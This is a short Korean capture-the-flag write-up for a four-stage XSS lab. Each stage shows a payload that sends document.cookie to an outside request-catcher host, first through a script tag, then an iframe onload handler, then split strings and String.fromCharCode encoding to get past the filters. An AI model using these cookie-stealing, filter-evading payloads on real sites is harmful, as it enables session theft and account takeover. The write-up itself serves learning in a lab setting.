이문제는 1단계부터 4단계까지 XSS 공격에 대한 필터를 점차 강화하면서 그거를 해결할때마다 다음 단계의 링크를 주는 문제
=> 이 문제를 푸는데는 이 전날에 풀었었던 웹해킹 XS-Search 문제가 크게 도움을 줌

1단계:
![image](https://github.com/DA2RIM/N0PSctf/assets/171825457/f664d941-8798-4135-a50f-ed6e3a052a57)

스크립트 : <script>location.href = "https://ikdlgok.request.dreamhack.games?cookie=" + document.cookie;</script>

![XSS Lab-1-2](https://github.com/DA2RIM/N0PSctf/assets/171825457/b516cfbd-fc77-4801-969b-f2c73d7811dd)

2단계:
![image](https://github.com/DA2RIM/N0PSctf/assets/171825457/a100c36f-5520-4820-b8fd-bfc65716ef4d)

스크립트 : <iframe onload='location.href="https://ziasnlk.request.dreamhack.games?cookie="+document.cookie'></iframe>

![XSS Lab-2-1](https://github.com/DA2RIM/N0PSctf/assets/171825457/ff5af29d-3c4c-4ebb-a2e3-6b55c0d2bcb8)

3단계 :
![image](https://github.com/DA2RIM/N0PSctf/assets/171825457/6d90f97b-1003-4813-95a4-f7c6fadb7184)

스크립트 : 
<iframe onload='location.href="https:/ziasnlk.request.dreamhack.games?coookie="+window["docu" + "ment"]["coo" + "kie"]'></iframe> 


4단계 :
![image](https://github.com/DA2RIM/N0PSctf/assets/171825457/a4d833eb-c953-44c1-9c5b-d70c4e03bed5)

스크립트 : <iframe onload='location.href=String.fromCharCode(104,116,116,112,115,58,47,47,103,121,102,116,117,105,98,46,114,101,113,117,101,115,116,46,100,114,101,97,109,104,97,99,107,46,103,97,109,101,115,63,99,111,111,107,105,101,61) .concat(window[String.fromCharCode(100,111,99,117,109,101,110,116)] [String.fromCharCode(99,111,111,107,105,101)])'>

![XSS Lab-final](https://github.com/DA2RIM/N0PSctf/assets/171825457/14d3e825-cf8a-4f34-9118-c56c42760c06)

4단계처럼 풀거였으면 1,2,3 단계도 다 아스키코드로 풀어도 됐을듯,,

